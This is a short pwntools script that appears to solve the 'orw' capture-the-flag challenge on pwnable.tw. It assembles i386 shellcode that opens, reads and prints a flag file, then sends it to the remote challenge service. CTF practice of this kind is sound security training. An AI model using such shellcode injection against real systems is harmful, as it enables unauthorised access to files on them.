from pwn import *
context.arch = 'i386'
# io = process("./orw")
io = remote("chall.pwnable.tw", 10001)

sc = asm(shellcraft.open("/home/orw/flag"))

sc += asm(shellcraft.read('eax', 0x0804A540, 0x40))

sc += asm(shellcraft.write(1, 0x0804A540, 0x40))

io.sendlineafter("Give my your shellcode:", sc)

io.interactive()
